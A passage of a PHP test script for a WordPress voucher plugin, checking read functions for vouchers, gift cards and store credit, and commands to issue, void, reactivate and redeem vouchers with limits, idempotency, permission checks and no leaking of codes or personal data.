	'gift'         => $vc7_read->gift_card( 42 ),
	'credit'       => $vc7_read->store_credit( 17 ),
	'redemption'   => $vc7_read->redemption( 9 ),
	'redemptions'  => $vc7_read->redemptions( 42 ),
	'order'        => $vc7_read->order_vouchers( 1042 ),
);
$vc7_v = $vc7_results['voucher'];
check( 'VC-7: read_voucher() returns exactly the documented keys in order', is_array( $vc7_v ) && VCAP\API\V1\ReadService::VOUCHER_KEYS === array_keys( $vc7_v ), wp_json_encode( array_keys( (array) $vc7_v ) ) );
check(
	'VC-7: voucher state – ids, type, status, amounts in minor units with currency, UTC timestamps, delivery, counts',
	is_array( $vc7_v ) && 42 === $vc7_v['voucher_id'] && 'giftcard' === $vc7_v['type'] && 'active' === $vc7_v['status'] && 'EUR' === $vc7_v['currency'] && 5000 === $vc7_v['amount_minor'] && 1250 === $vc7_v['balance_minor']
		&& 1042 === $vc7_v['order_id'] && 55 === $vc7_v['product_id'] && null === $vc7_v['user_id'] && true === $vc7_v['transferable'] && '2029-12-31T23:59:59Z' === $vc7_v['expires_at'] && '2026-11-01T07:59:00Z' === $vc7_v['created_at']
		&& 'delivered' === $vc7_v['delivery_state'] && '2026-11-01T08:00:00Z' === $vc7_v['delivered_at'] && array( 'recipient' ) === $vc7_v['delivered_roles'] && 0 === $vc7_v['delivery_failures'] && null === $vc7_v['void_reason']
		&& array( 'reserved' => 0, 'committed' => 2, 'released' => 1 ) === $vc7_v['redemption_counts'] && $vc7_v === $vc7_results['voucher_str'],
	wp_json_encode( $vc7_v )
);
$vc7_void = $vc7_results['void'];
check( 'VC-7: a void voucher reports void_reason through Issuer::voided_after_refund() with a voucher object without code or addresses; JPY has no minor digits; a given-up delivery is reported', is_array( $vc7_void ) && 'refund' === $vc7_void['void_reason'] && array( array( 43, 'void', 0, '', '' ) ) === $vc7_void_calls && 5000 === $vc7_void['amount_minor'] && 'JPY' === $vc7_void['currency'] && null === $vc7_void['order_id'] && 'given_up' === $vc7_void['delivery_state'] && 1 === $vc7_void['delivery_failures'] && '2099-01-01T09:00:00Z' === $vc7_void['delivery_at'], wp_json_encode( $vc7_void ) );
check( 'VC-7: read_gift_card() adds the top-up counts; null for a voucher of another type', is_array( $vc7_results['gift'] ) && array_merge( VCAP\API\V1\ReadService::VOUCHER_KEYS, VCAP\API\V1\ReadService::GIFT_CARD_KEYS ) === array_keys( $vc7_results['gift'] ) && 3 === $vc7_results['gift']['top_up_count'] && 1 === $vc7_results['gift']['top_up_reversed_count'] && null === $vc7_read->gift_card( 43 ) );
check( 'VC-7: read_store_credit() – account of the user with balance in minor units (KWD: three digits)', VCAP\API\V1\ReadService::STORE_CREDIT_KEYS === array_keys( (array) $vc7_results['credit'] ) && 17 === $vc7_results['credit']['user_id'] && 44 === $vc7_results['credit']['account_id'] && 3125 === $vc7_results['credit']['balance_minor'] && 'KWD' === $vc7_results['credit']['currency'], wp_json_encode( $vc7_results['credit'] ) );
$vc7_r = $vc7_results['redemption'];
check( 'VC-7: read_redemption() – state, channel, amount in minor units with the voucher currency, committed_at only when committed, no expiry after the reservation', VCAP\API\V1\ReadService::REDEMPTION_KEYS === array_keys( (array) $vc7_r ) && 9 === $vc7_r['redemption_id'] && 42 === $vc7_r['voucher_id'] && 'committed' === $vc7_r['state'] && 'external' === $vc7_r['channel'] && 750 === $vc7_r['amount_minor'] && 'EUR' === $vc7_r['currency'] && 17 === $vc7_r['user_id'] && null === $vc7_r['expires_at'] && '2026-11-02T10:01:00Z' === $vc7_r['committed_at'], wp_json_encode( $vc7_r ) );
check( 'VC-7: read_redemptions() lists the redemptions of a voucher (a reserved one with its expiry); [] for a voucher without any', 2 === count( (array) $vc7_results['redemptions'] ) && 'reserved' === $vc7_results['redemptions'][1]['state'] && '2026-11-02T10:15:00Z' === $vc7_results['redemptions'][1]['expires_at'] && null === $vc7_results['redemptions'][1]['committed_at'] && array() === $vc7_read->redemptions( 43 ) );
check( 'VC-7: read_order_vouchers() – number and ids of the vouchers of an order', array( 'order_id' => 1042, 'voucher_count' => 2, 'voucher_ids' => array( 42, 44 ) ) === $vc7_results['order'] );
check(
	'VC-7: unknown ids, zero, negative ids and strings that are no whole number (a code) answer null',
	null === $vc7_read->voucher( 4711 ) && null === $vc7_read->voucher( 0 ) && null === $vc7_read->voucher( -42 ) && null === $vc7_read->voucher( $vc7_code ) && null === $vc7_read->voucher( '42abc' ) && null === $vc7_read->voucher( '042' ) && null === $vc7_read->voucher( '' )
		&& null === $vc7_read->gift_card( 4711 ) && null === $vc7_read->store_credit( 18 ) && null === $vc7_read->store_credit( 'marker.buyer@example.test' ) && null === $vc7_read->redemption( 10 ) && null === $vc7_read->redemption( 'rk-marker-secret-key' )
		&& null === $vc7_read->redemptions( 4711 ) && null === $vc7_read->order_vouchers( 1043 ) && null === $vc7_read->order_vouchers( 0 )
);
$vc7_json   = strtolower( (string) wp_json_encode( $vc7_results ) . serialize( $vc7_results ) );
$vc7_leaked = array_values( array_filter( $vc7_secrets, static fn( $s ) => str_contains( $vc7_json, strtolower( $s ) ) ) );
check( 'VC-7: no code (nor its tail or hash), token, name, address, message, field, terms, note, redemption key, target, meta, till or receipt of the fixtures appears in any result', array() === $vc7_leaked, implode( ', ', $vc7_leaked ) );
$vc7_keys = array();
array_walk_recursive( $vc7_results, static function ( $v, $k ) use ( &$vc7_keys ) { $vc7_keys[] = (string) $k; } );
foreach ( $vc7_results as $vc7_res ) {
	foreach ( (array) $vc7_res as $vc7_k => $vc7_val ) {
		$vc7_keys[] = (string) $vc7_k;
	}
}
check( 'VC-7: no result key names a code, token, name, email, message, note, reference, redemption key, target, meta or receipt', ! preg_grep( '/(code|token|name|email|message|note|reference|redemption_key|target|meta|receipt|till|fields|terms)/', array_unique( $vc7_keys ) ) );
$vc7_sql = $GLOBALS['wpdb']->log;
check( 'VC-7: only SELECTs; no SELECT *; the queries never name code, token, names, addresses, message, fields, terms, redemption key, target, request hash or meta', count( $vc7_sql ) > 10 && array() === preg_grep( '/^\s*SELECT\b/i', $vc7_sql, PREG_GREP_INVERT ) && ! preg_grep( '/SELECT \*|\b(INSERT|UPDATE|DELETE|REPLACE|GET_LOCK|FOR UPDATE)\b/i', $vc7_sql ) && ! preg_grep( '/\b(code|token|buyer_name|buyer_email|recipient_name|recipient_email|message|fields|terms|redemption_key|target|request_hash|meta|note|till|receipt)\b/', $vc7_sql ), implode( ' | ', $vc7_sql ) );
check( 'VC-7: reading changes no option and no transient', $vc7_options === ( $GLOBALS['vcap_test_options'] ?? array() ) && $vc7_transients === ( $GLOBALS['vcap_test_transients'] ?? array() ) );
$vc7_src = (string) file_get_contents( VCAP_PATH . 'src/API/V1/ReadService.php' );
check( 'VC-7: ReadService fires no hook, writes nothing and does not go through the code lookups', ! preg_match( '/\b(do_action|apply_filters|Db::action|update_option|add_option|delete_option|set_transient|wp_cache_set|update_post_meta|->insert\(|->update\(|->delete\(|->query\(|->replace\(|get_by_code|get_by_token|->redemptions->get|->account\()/', $vc7_src ) );
$vc7_fn = (string) file_get_contents( VCAP_PATH . 'src/functions.php' );
$vc7_main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
$vc7_api  = (string) file_get_contents( VCAP_PATH . 'API.md' );
$vc7_names = array( 'vcap_read_voucher' => 'voucher', 'vcap_read_gift_card' => 'gift_card', 'vcap_read_store_credit' => 'store_credit', 'vcap_read_redemption' => 'redemption', 'vcap_read_redemptions' => 'redemptions', 'vcap_read_order_vouchers' => 'order_vouchers' );
$vc7_missing = array_keys( array_filter( $vc7_names, static fn( $m, $f ) => ! str_contains( $vc7_fn, "function {$f}( int|string \$" ) || ! str_contains( $vc7_fn, "vcap()->read->{$m}(" ) || ! str_contains( $vc7_api, "`{$f}( int\\|string" ) || ! method_exists( VCAP\API\V1\ReadService::class, $m ), ARRAY_FILTER_USE_BOTH ) );
check( 'VC-7: each read function wraps vcap()->read, is loaded after boot and documented in API.md with "Since 1.3.0"; Plugin exposes vcap()->read', array() === $vc7_missing && str_contains( $vc7_main, "require_once VCAP_PATH . 'src/functions.php';" ) && strpos( $vc7_main, "require_once VCAP_PATH . 'src/functions.php';" ) > strpos( $vc7_main, 'function vcap(): \VCAP\Plugin' ) && str_contains( $vc7_api, '## Read functions (since 1.3.0, contract 1.2.0)' ) && property_exists( VCAP\Plugin::class, 'read' ), implode( ', ', $vc7_missing ) );
require_once VCAP_PATH . 'src/functions.php';
check( 'VC-7: without vcap()->read (plugin not booted) the functions answer null instead of failing', null === vcap_read_voucher( 42 ) && null === vcap_read_store_credit( 17 ) && null === vcap_read_order_vouchers( 1042 ) );
preg_match( "/define\( 'VCAP_CONTRACT_VERSION', '(\d+\.\d+\.\d+)' \);/", $vc7_main, $vc7_contract );
check( 'VC-7: the read functions raised the contract version to at least 1.2.0 (additive minor within major 1)', isset( $vc7_contract[1] ) && version_compare( $vc7_contract[1], '1.2.0', '>=' ) && str_starts_with( $vc7_contract[1], '1.' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'CONNECTORS.md' ), '| 1.2.0 | 1.3.0 | read functions `vcap_read_voucher()`' ) );
$GLOBALS['wpdb'] = $vc7_saved_wpdb;

// VC-1 / VOUCH-WF-13 (suite spec 8.3, R-8.1 to R-8.13; VC-2, VC-9): the four voucher commands with fixed limits,
// switches (off by default), idempotency, permission of the authorising user, protocol and history without code.
echo "\nVC-1: voucher commands (contract 1.3.0)\n";
final class VCAP_Test_Command_Store implements VCAP\API\V1\CommandStore {
	public array $replies = array(); public array $counts = array(); public array $log = array(); public bool $locked = false; public bool $lock_ok = true; public int $locks = 0;
	public function lock(): bool { if ( ! $this->lock_ok ) { return false; } $this->locked = true; ++$this->locks; return true; }
	public function unlock(): void { $this->locked = false; }
	public function reply( string $key ): ?array { return $this->replies[ $key ] ?? null; }
	public function save_reply( string $key, string $hash, array $result, string $day ): void { $this->replies[ $key ] = array( 'hash' => $hash, 'result' => $result ); }
	public function count( string $day, string $bucket ): int { return (int) ( $this->counts[ $day ][ $bucket ] ?? 0 ); }
	public function increment( string $day, array $buckets ): void { foreach ( $buckets as $b ) { $this->counts[ $day ][ $b ] = $this->count( $day, $b ) + 1; } }
	public function protocol( string $day, array $entry ): void { $this->log[ $day ][] = $entry; }
	public function entries( string $day ): array { return $this->log[ $day ] ?? array(); }
}
final class VCAP_Test_Command_Backend implements VCAP\API\V1\CommandBackend {
	public array $vouchers = array(); public array $caps = array(); public array $users = array(); public array $calls = array(); public array $history = array();
	public string $day = '2026-11-16'; public string $currency = 'EUR'; public int $next = 500; public bool $refund_void = false; public bool $locked_seen = true; public ?VCAP_Test_Command_Store $store = null;
	public function voucher( int $id ): ?Voucher { return isset( $this->vouchers[ $id ] ) ? clone $this->vouchers[ $id ] : null; }
	public function user_can( int $user_id, string $capability ): bool { return in_array( $capability, $this->caps[ $user_id ] ?? array(), true ); }
	public function recipient( int $user_id ): ?array { return $this->users[ $user_id ] ?? null; }
	public function shop_currency(): string { return $this->currency; }
	public function today(): string { return $this->day; }
	public function product_refusal( int $product_id ): string { return 77 === $product_id ? 'percent_not_allowed' : ( 55 === $product_id ? '' : 'invalid_product' ); }
	private function seen(): void { $this->locked_seen = $this->locked_seen && $this->store && $this->store->locked; }
	public function issue( array $args ): Voucher|WP_Error {
		$this->seen(); $this->calls[] = array( 'issue', $args );
		$v = new Voucher(); $v->id = $this->next++; $v->code = 'MARKERCMD-' . $v->id . 'ZQ'; $v->type = 'voucher'; $v->usage_mode = 'single'; $v->discount_type = 'fixed_cart'; $v->currency = $this->currency; $v->initial_amount = (float) $args['amount']; $v->balance = (float) $args['amount']; $v->status = 'active'; $v->recipient_email = $args['recipient_email'];
		$this->vouchers[ $v->id ] = $v;
		return $v;
	}
	public function void( Voucher $voucher ): bool { $this->seen(); $this->calls[] = array( 'void', $voucher->id ); $this->vouchers[ $voucher->id ]->status = 'void'; return true; }
	public function reactivate( Voucher $voucher ): bool { $this->seen(); $this->calls[] = array( 'reactivate', $voucher->id ); $this->vouchers[ $voucher->id ]->status = 'active'; return true; }
	public function voided_after_refund( Voucher $voucher ): bool { return $this->refund_void; }
	public function redeem( Voucher $voucher, float $amount, string $target, string $key ): Voucher|WP_Error {
		$this->seen(); $this->calls[] = array( 'redeem', $voucher->id, $amount, $target, $key );
		$v = $this->vouchers[ $voucher->id ];
		if ( $v->is_multi_use() ) { $v->balance = round( $v->balance - $amount, 2 ); $v->status = $v->balance <= 0 ? 'redeemed' : 'active'; } else { $v->status = 'redeemed'; }
		return clone $v;
	}
	public function history( int $voucher_id, ?float $amount, string $note ): void { $this->history[] = array( $voucher_id, $amount, $note ); }
}
$vc1_mk = static function ( int $id, array $over = array() ): Voucher {
	$v = new Voucher(); $v->id = $id; $v->code = 'MARKERCMD-' . $id . 'ZQ'; $v->type = 'giftcard'; $v->usage_mode = 'balance'; $v->discount_type = 'fixed_cart'; $v->currency = 'EUR'; $v->initial_amount = 80.0; $v->balance = 60.0; $v->status = 'active'; $v->recipient_email = 'marker.cmd@example.test'; $v->recipient_name = 'Marker Cmd';
	foreach ( $over as $k => $val ) { $v->$k = $val; }
	return $v;
};
$vc1_new = static function () use ( $vc1_mk ): array {
	$store = new VCAP_Test_Command_Store();
	$be    = new VCAP_Test_Command_Backend();
	$be->store = $store;
	$be->caps  = array( 7 => array( 'vcap_manage_vouchers', 'vcap_increase_balance' ), 8 => array( 'vcap_redeem_api' ), 9 => array( 'read' ) );
	$be->users = array( 21 => array( 'email' => 'marker.recipient@example.test', 'name' => 'Marker Recipient' ), 22 => array( 'email' => 'marker.two@example.test', 'name' => 'Marker Two' ) );
	$be->vouchers = array( 42 => $vc1_mk( 42 ), 43 => $vc1_mk( 43, array( 'status' => 'void' ) ), 44 => $vc1_mk( 44, array( 'type' => 'voucher', 'usage_mode' => 'single', 'initial_amount' => 25.0, 'balance' => 25.0 ) ), 45 => $vc1_mk( 45, array( 'type' => 'credit' ) ), 46 => $vc1_mk( 46, array( 'discount_type' => 'percent', 'type' => 'voucher', 'usage_mode' => 'single' ) ), 47 => $vc1_mk( 47, array( 'status' => 'redeemed', 'balance' => 0.0 ) ) );
	return array( new VCAP\API\V1\CommandService( $be, $store ), $be, $store );
};
$vc1_n    = 0;
$vc1_args = static function ( array $extra = array() ) use ( &$vc1_n ): array {
	++$vc1_n;
	return $extra + array( 'idempotency_key' => 'wf-3:v2:evt-' . $vc1_n . ':step-1', 'reason' => 'loyalty_reward', 'workflow_id' => 3, 'run_id' => 'run-' . $vc1_n, 'step_id' => 'step-1', 'authorized_by_user_id' => 7 );
};
$vc1_saved_opts = $GLOBALS['vcap_test_options'] ?? array();
$vc1_on = static function ( array $commands ): void {
	foreach ( $commands as $c ) {
		$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( $c, 'enabled' ) ] = 'yes';
	}
};
$vc1_off = static function (): void {
	foreach ( array_keys( $GLOBALS['vcap_test_options'] ?? array() ) as $k ) {
		if ( str_starts_with( (string) $k, 'vcap_command_' ) ) {
			unset( $GLOBALS['vcap_test_options'][ $k ] );
		}
	}
};
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'EUR';
$vc1_off();
list( $vc1, $vc1_be, $vc1_store ) = $vc1_new();
$vc1_all = array();
$vc1_off_results = array(
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 21, 'amount_minor' => 1000, 'currency' => 'EUR' ) ) ),
	$vc1->void( $vc1_args( array( 'voucher_id' => 42 ) ) ),
	$vc1->reactivate( $vc1_args( array( 'voucher_id' => 43 ) ) ),
	$vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 500, 'currency' => 'EUR', 'target' => 'course_unlock' ) ) ),
);
$vc1_all = array_merge( $vc1_all, $vc1_off_results );
check( 'VC-1: all four commands are off by default (R-8.3d) – refused, final, code command_disabled, nothing executed', 4 === count( array_filter( $vc1_off_results, static fn( $r ) => 'refused' === $r['status'] && 'command_disabled' === $r['code'] && true === $r['final'] ) ) && array() === $vc1_be->calls && ! VCAP\API\V1\CommandLimits::enabled( 'voucher.issue' ), wp_json_encode( $vc1_off_results ) );
check( 'VC-1: every reply has exactly the documented keys in order', 4 === count( array_filter( $vc1_off_results, static fn( $r ) => VCAP\API\V1\CommandService::RESULT_KEYS === array_keys( $r ) ) ) );
check( 'VC-1: the fixed table of 8.3.1 – issue 100 EUR / 50 a day / 1 per recipient, void and reactivate 50, redeem 100 EUR / 50', array( 'per_day' => 50, 'per_recipient' => 1, 'max_amount_minor' => 10000, 'amount_allowed' => true ) === VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'EUR' ) && 50 === VCAP\API\V1\CommandLimits::effective( 'voucher.void' )['per_day'] && 50 === VCAP\API\V1\CommandLimits::effective( 'voucher.reactivate' )['per_day'] && array( 'per_day' => 50, 'per_recipient' => null, 'max_amount_minor' => 10000, 'amount_allowed' => true ) === VCAP\API\V1\CommandLimits::effective( 'voucher.redeem', 'EUR' ) );

$vc1_on( VCAP\API\V1\CommandLimits::COMMANDS );
list( $vc1, $vc1_be, $vc1_store ) = $vc1_new();
$vc1_i_args = $vc1_args( array( 'recipient_user_id' => 21, 'amount_minor' => 2550, 'currency' => 'EUR' ) );
$vc1_i      = $vc1->issue( $vc1_i_args );
$vc1_all[]  = $vc1_i;
$vc1_issue_call = $vc1_be->calls[0][1] ?? array();
check( 'VC-1: issue – done, voucher id and state, amount in minor units; the core gets the address from the user account, sends its own mail, no own code, not paid', 'done' === $vc1_i['status'] && 'issued' === $vc1_i['code'] && 500 === $vc1_i['voucher_id'] && 'active' === $vc1_i['voucher_status'] && 2550 === $vc1_i['amount_minor'] && 'EUR' === $vc1_i['currency'] && 25.5 === $vc1_issue_call['amount'] && 'marker.recipient@example.test' === $vc1_issue_call['recipient_email'] && true === $vc1_issue_call['send'] && false === $vc1_issue_call['paid'] && ! isset( $vc1_issue_call['code'], $vc1_issue_call['allow_weak'], $vc1_issue_call['discount_type'] ) && str_starts_with( (string) $vc1_issue_call['reference'], 'command:' ) && $vc1_be->locked_seen, wp_json_encode( array( $vc1_i, $vc1_issue_call ) ) );
$vc1_replay = $vc1->issue( $vc1_i_args );
$vc1_all[]  = $vc1_replay;
check( 'VC-1: the same key returns the stored reply of the first call and does nothing (R-8.3a)', 1 === count( $vc1_be->calls ) && true === $vc1_replay['replayed'] && array_diff_key( $vc1_replay, array( 'replayed' => 1 ) ) === array_diff_key( $vc1_i, array( 'replayed' => 1 ) ) && 1 === $vc1_store->count( '2026-11-16', 'voucher.issue' ) );
$vc1_conflict = $vc1->issue( array( 'amount_minor' => 2600 ) + $vc1_i_args );
$vc1_all[]    = $vc1_conflict;
check( 'VC-1: the same key with other values is refused as idempotency_conflict, nothing executed, the first reply stays', 'refused' === $vc1_conflict['status'] && 'idempotency_conflict' === $vc1_conflict['code'] && 1 === count( $vc1_be->calls ) && 2550 === $vc1_store->replies[ $vc1_i_args['idempotency_key'] ]['result']['amount_minor'] );
$vc1_r1 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 21, 'amount_minor' => 1000, 'currency' => 'EUR' ) ) );
$vc1_r2 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 1000, 'currency' => 'EUR' ) ) );
array_push( $vc1_all, $vc1_r1, $vc1_r2 );
check( 'VC-1: 1 voucher per recipient and day – a second one for the same user is refused, another user still gets one', 'refused' === $vc1_r1['status'] && 'recipient_daily_limit_reached' === $vc1_r1['code'] && true === $vc1_r1['final'] && 'done' === $vc1_r2['status'] && 2 === count( $vc1_be->calls ) );
$vc1_be->day = '2026-11-17';
$vc1_r3      = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 21, 'amount_minor' => 1000, 'currency' => 'EUR' ) ) );
check( 'VC-1: counters are per calendar day – the next day the recipient may get one again', 'done' === $vc1_r3['status'] );
$vc1_be->day = '2026-11-16';
$vc1_over = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 10001, 'currency' => 'EUR' ) ) );
$vc1_max  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 10001, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 8 ) ) );
array_push( $vc1_all, $vc1_over, $vc1_max );
check( 'VC-1: amounts above 100 EUR are refused, not shortened (issue per voucher, redeem per redemption)', 'amount_over_limit' === $vc1_over['code'] && 'refused' === $vc1_over['status'] && 'amount_over_limit' === $vc1_max['code'] && 3 === count( $vc1_be->calls ) );
// Daily limit per site: 50 a day; a lowered setting (3) wins, a higher one (500) never raises.
$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.void', 'per_day' ) ] = '500';
check( 'VC-1: a setting above the table does not raise the limit (50)', 50 === VCAP\API\V1\CommandLimits::effective( 'voucher.void' )['per_day'] );
add_filter( 'vcap_command_limits', $vc1_raise = static fn( $l ) => array( 'per_day' => 999, 'max_amount_minor' => 99999, 'enabled' => true ) + $l );
check( 'VC-1: the filter cannot raise a limit either', 50 === VCAP\API\V1\CommandLimits::effective( 'voucher.void' )['per_day'] && 10000 === VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'EUR' )['max_amount_minor'] );
remove_filter( 'vcap_command_limits', $vc1_raise );
$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.void', 'per_day' ) ] = '2';
for ( $i = 100; $i < 103; $i++ ) {
	$vc1_be->vouchers[ $i ] = $vc1_mk( $i );
}
$vc1_v = array();
for ( $i = 100; $i < 103; $i++ ) {
	$vc1_v[] = $vc1->void( $vc1_args( array( 'voucher_id' => $i ) ) );
}
$vc1_all = array_merge( $vc1_all, $vc1_v );
check( 'VC-1: daily limit per site – the operator lowered void to 2: the third void of the day is refused (daily_limit_reached), no refund path', 'voided' === $vc1_v[0]['code'] && 'void' === $vc1_v[0]['voucher_status'] && 'done' === $vc1_v[1]['status'] && 'refused' === $vc1_v[2]['status'] && 'daily_limit_reached' === $vc1_v[2]['code'] && 'active' === $vc1_be->vouchers[102]->status && 2 === $vc1_store->count( '2026-11-16', 'voucher.void' ) );
$vc1_dup = $vc1->void( $vc1_args( array( 'voucher_id' => 43 ) ) );
$vc1_all[] = $vc1_dup;
check( 'VC-1: void of a void voucher – duplicate already_void, counts nothing', 'duplicate' === $vc1_dup['status'] && 'already_void' === $vc1_dup['code'] && 2 === $vc1_store->count( '2026-11-16', 'voucher.void' ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.void', 'per_day' ) ] );
$vc1_issue_limit = $GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'per_day' ) ] = '2';
$vc1_l = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR' ) ) );
check( 'VC-1: daily limit of issue per site (lowered to 2: two issued today) refuses the next one', 'daily_limit_reached' === $vc1_l['code'] );
unset( $GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'per_day' ) ] );
// Full 50 a day for reactivate.
list( $vc1b, $vc1b_be, $vc1b_store ) = $vc1_new();
for ( $i = 1000; $i < 1051; $i++ ) {
	$vc1b_be->vouchers[ $i ] = $vc1_mk( $i, array( 'status' => 'void' ) );
}
$vc1_ra = array();
for ( $i = 1000; $i < 1051; $i++ ) {
	$vc1_ra[] = $vc1b->reactivate( $vc1_args( array( 'voucher_id' => $i ) ) );
}
check( 'VC-1: reactivate – 50 a day and site by default, the 51st is refused; separate counter from void', 50 === count( array_filter( $vc1_ra, static fn( $r ) => 'reactivated' === $r['code'] ) ) && 'daily_limit_reached' === $vc1_ra[50]['code'] && 0 === $vc1b_store->count( '2026-11-16', 'voucher.void' ) && 50 === $vc1b_store->count( '2026-11-16', 'voucher.reactivate' ) );
$vc1_be->refund_void = true;
$vc1_rr = $vc1->reactivate( $vc1_args( array( 'voucher_id' => 43 ) ) );
$vc1_be->refund_void = false;
$vc1_ra2 = $vc1->reactivate( $vc1_args( array( 'voucher_id' => 47 ) ) );
array_push( $vc1_all, $vc1_rr, $vc1_ra2 );
check( 'VC-1: reactivate refuses a voucher voided because of a refund (after_refund fixed false) and one that is not void', 'voided_after_refund' === $vc1_rr['code'] && 'not_void' === $vc1_ra2['code'] );
// Permission (R-8.4 to R-8.8, VC-9): the authorising user, never the current user.
$vc1_p = array(
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'authorized_by_user_id' => 9 ) ) ),
	$vc1->void( $vc1_args( array( 'voucher_id' => 102, 'authorized_by_user_id' => 8 ) ) ),
	$vc1->reactivate( $vc1_args( array( 'voucher_id' => 43, 'authorized_by_user_id' => 8 ) ) ),
	$vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 100, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 404 ) ) ),
);
$vc1_all = array_merge( $vc1_all, $vc1_p );
check( 'VC-1/VC-9: a user without the capability (or unknown) is refused not_authorized, final; the core checks it itself', 4 === count( array_filter( $vc1_p, static fn( $r ) => 'not_authorized' === $r['code'] && true === $r['final'] ) ) );
$vc1_src = (string) file_get_contents( VCAP_PATH . 'src/API/V1/CommandService.php' ) . file_get_contents( VCAP_PATH . 'src/API/V1/CoreCommandBackend.php' );
check( 'VC-1/VC-9: no wp_set_current_user(), no current_user_can(); user_can() on the authorising user; refund paths fixed off; refund() not reachable', ! preg_match( '/wp_set_current_user|current_user_can|->refund\(|void_purchase|void_or_retry/', $vc1_src ) && str_contains( $vc1_src, 'user_can( $user, $capability )' ) && str_contains( $vc1_src, "->void( \$voucher, '', false )" ) && str_contains( $vc1_src, '->reactivate( $voucher, false )' ) );
// Redeem.
$vc1_rd   = $vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 1250, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 8 ) ) );
$vc1_call = end( $vc1_be->calls );
$vc1_rd2  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 4751, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 8 ) ) );
$vc1_rd3  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 44, 'amount_minor' => 1000, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 8 ) ) );
$vc1_rd4  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 44, 'amount_minor' => 2500, 'currency' => 'EUR', 'target' => 'course_unlock', 'authorized_by_user_id' => 8 ) ) );
$vc1_rd5  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 45, 'amount_minor' => 100, 'currency' => 'EUR', 'target' => 'course_unlock' ) ) );
$vc1_rd6  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 46, 'amount_minor' => 100, 'currency' => 'EUR', 'target' => 'course_unlock' ) ) );
$vc1_rd7  = $vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 100, 'currency' => 'USD', 'target' => 'course_unlock' ) ) );
array_push( $vc1_all, $vc1_rd, $vc1_rd2, $vc1_rd3, $vc1_rd4, $vc1_rd5, $vc1_rd6, $vc1_rd7 );
check( 'VC-1: redeem by voucher_id – partial amount in minor units, balance after in minor units, reserve and commit by the core under a derived key', 'done' === $vc1_rd['status'] && 'redeemed' === $vc1_rd['code'] && 4750 === $vc1_rd['balance_minor'] && 1250 === $vc1_rd['amount_minor'] && 'redeem' === $vc1_call[0] && 12.5 === $vc1_call[2] && 'workflow:course_unlock' === $vc1_call[3] && (bool) preg_match( VCAP\API\V1\RedemptionService::KEY_PATTERN, $vc1_call[4] ), wp_json_encode( array( $vc1_rd, $vc1_call ) ) );
check( 'VC-1: redeem never more than the remaining value; a single-use voucher only as a whole; store credit and percentage vouchers refused; currency must match', 'insufficient_balance' === $vc1_rd2['code'] && 'amount_mismatch' === $vc1_rd3['code'] && 'done' === $vc1_rd4['status'] && 'unsupported_voucher' === $vc1_rd5['code'] && 'unsupported_voucher' === $vc1_rd6['code'] && 'currency_mismatch' === $vc1_rd7['code'] );
// VC-2: no code, no e-mail address, no own code / allow_weak / percent / paid.
$vc1_bad = array(
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'code' => 'MYOWNCODE1' ) ) ),
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'allow_weak' => true ) ) ),
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'paid' => true ) ) ),
	$vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'discount_type' => 'percent' ) ) ),
	$vc1->issue( $vc1_args( array( 'recipient_email' => 'x@example.test', 'amount_minor' => 100, 'currency' => 'EUR' ) ) ),
	$vc1->void( $vc1_args( array( 'code' => 'MARKERCMD-42ZQ' ) ) ),
	$vc1->void( $vc1_args( array( 'voucher_id' => 42, 'refund' => true ) ) ),
	$vc1->reactivate( $vc1_args( array( 'voucher_id' => 43, 'after_refund' => true ) ) ),
	$vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => '12.50', 'currency' => 'EUR', 'target' => 'course_unlock' ) ) ),
	$vc1->redeem( $vc1_args( array( 'voucher_id' => 42, 'amount_minor' => 100, 'currency' => 'EUR', 'target' => 'free text target' ) ) ),
	$vc1->void( $vc1_args( array( 'voucher_id' => 42, 'reason' => 'Free text reason' ) ) ),
